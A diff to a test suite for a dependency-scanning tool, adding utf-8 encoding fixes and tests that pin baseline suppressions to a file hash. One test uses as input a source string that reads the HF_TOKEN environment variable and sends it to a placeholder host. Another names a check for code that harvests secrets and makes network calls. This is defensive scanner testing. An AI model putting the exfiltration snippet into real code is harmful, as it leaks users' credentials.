@@ -4,6 +4,7 @@
 from __future__ import annotations
 
 import hashlib
+import json
 import os
 import re
 import subprocess
@@ -35,9 +36,11 @@ def test_fixture_bytes_are_deterministic(tmp_path):
     rebuild_dir = tmp_path / "rebuild"
     rebuild_dir.mkdir()
     # The build helper writes to its own dir; copy + patch HERE.
-    builder_src = (FIXTURES / "_build.py").read_text()
+    builder_src = (FIXTURES / "_build.py").read_text(encoding = "utf-8")
     rebuilt_helper = rebuild_dir / "_build.py"
-    rebuilt_helper.write_text(builder_src)
+    # builder_src came out of a checked-in file, so it carries whatever
+    # non-ASCII that file holds and cp1252 cannot encode it back out.
+    rebuilt_helper.write_text(builder_src, encoding = "utf-8")
     # Run with SOURCE_DATE_EPOCH=0 and HERE override via a shim.
     shim = rebuild_dir / "run.py"
     shim.write_text(
@@ -1238,7 +1241,7 @@ def test_write_baseline_roundtrip_only_crit_high(tmp_path):
 
 
 def test_load_baseline_missing_file_is_empty():
-    assert sp._load_baseline("/nonexistent/path/bl.json") == set()
+    assert sp._load_baseline("/nonexistent/path/bl.json") == {}
 
 
 def test_load_baseline_rejects_non_list_entries(tmp_path, capsys):
@@ -1248,7 +1251,7 @@ def test_load_baseline_rejects_non_list_entries(tmp_path, capsys):
 
     bl = tmp_path / "bad_entries.json"
     bl.write_text(json.dumps({"version": 1, "entries": None}), encoding = "utf-8")
-    assert sp._load_baseline(str(bl)) == set()
+    assert sp._load_baseline(str(bl)) == {}
     assert "entries is not a list" in capsys.readouterr().err
 
 
@@ -1260,7 +1263,7 @@ def test_committed_baseline_suppresses_known_but_not_a_new_payload():
     import json
 
     baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
-    entries = json.loads(baseline_path.read_text())["entries"]
+    entries = json.loads(baseline_path.read_text(encoding = "utf-8"))["entries"]
     target = next(
         e
         for e in entries
@@ -1296,7 +1299,7 @@ def test_committed_baseline_entries_all_carry_evidence_hash():
     import json
 
     baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
-    entries = json.loads(baseline_path.read_text())["entries"]
+    entries = json.loads(baseline_path.read_text(encoding = "utf-8"))["entries"]
     assert entries, "committed baseline should not be empty"
     missing = [
         f"{e['package']}:{e['file']}:{e['check']}" for e in entries if not e.get("evidence_hash")
@@ -1595,3 +1598,72 @@ def test_run_fix_uses_first_archive_path(monkeypatch):
     sp._run_fix({"foo"}, entries, max_search = 10)  # must not raise
 
     assert seen.get("path") == "/tmp/foo-1.2.3.whl"
+
+
+def test_pinned_baseline_entry_only_covers_the_reviewed_file(tmp_path):
+    """A file_sha256 pin reopens the finding when anything else in the file changes.
+
+    The evidence for an env-harvest + network finding records the urlopen call but
+    not the destination, so a release that repoints the endpoint at an attacker host
+    keeps the same evidence hash. Pinning binds the entry to the reviewed bytes.
+    """
+    bl = tmp_path / "bl.json"
+    check = "Harvests environment variables/secrets AND makes network calls"
+    reviewed = _mk(sp.CRITICAL, "unsloth-zoo", "z/health.py", check, "Env: L1: token")
+    reviewed.file_sha256 = "a" * 64
+    sp._write_baseline(str(bl), [reviewed])
+
+    # _write_baseline only pins what was already pinned, so a fresh entry is unpinned.
+    doc = json.loads(bl.read_text(encoding = "utf-8"))
+    assert "file_sha256" not in doc["entries"][0]
+    doc["entries"][0]["file_sha256"] = "a" * 64
+    bl.write_text(json.dumps(doc), encoding = "utf-8")
+    baseline = sp._load_baseline(str(bl))
+
+    active, suppressed = sp._partition_baseline([reviewed], baseline)
+    assert suppressed == [reviewed] and active == []
+
+    # Same package/file/check/evidence, different file bytes -> reopens.
+    tampered = _mk(sp.CRITICAL, "unsloth-zoo", "z/health.py", check, "Env: L1: token")
+    tampered.file_sha256 = "b" * 64
+    active2, suppressed2 = sp._partition_baseline([tampered], baseline)
+    assert active2 == [tampered] and suppressed2 == []
+
+
+def test_unpinned_baseline_entry_is_content_agnostic(tmp_path):
+    """Entries without file_sha256 keep the pre-existing behaviour."""
+    bl = tmp_path / "bl.json"
+    f = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
+    f.file_sha256 = "a" * 64
+    sp._write_baseline(str(bl), [f])
+    baseline = sp._load_baseline(str(bl))
+    assert baseline[sp._finding_key(f)] is None
+
+    other = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
+    other.file_sha256 = "b" * 64
+    active, suppressed = sp._partition_baseline([other], baseline)
+    assert suppressed == [other] and active == []
+
+
+def test_write_baseline_preserves_an_existing_pin(tmp_path):
+    """Regenerating must not silently widen a pinned entry back to any content."""
+    bl = tmp_path / "bl.json"
+    f = _mk(sp.CRITICAL, "p", "a.py", "c1", "L1: x")
+    f.file_sha256 = "a" * 64
+    sp._write_baseline(str(bl), [f])
+    doc = json.loads(bl.read_text(encoding = "utf-8"))
+    doc["entries"][0]["file_sha256"] = "a" * 64
+    bl.write_text(json.dumps(doc), encoding = "utf-8")
+
+    sp._write_baseline(str(bl), [f])
+    doc2 = json.loads(bl.read_text(encoding = "utf-8"))
+    assert doc2["entries"][0]["file_sha256"] == "a" * 64
+
+
+def test_check_py_file_stamps_the_file_digest():
+    """Findings carry the digest the pin is matched against."""
+    src = 'import requests\nimport os\nt = os.environ["HF_TOKEN"]\nrequests.get("http://x", headers={"a": t})\n'
+    findings = sp.check_py_file(src, "p/a.py", "p")
+    assert findings, "expected at least one finding"
+    expected = hashlib.sha256(src.encode("utf-8", "replace")).hexdigest()
+    assert all(f.file_sha256 == expected for f in findings)
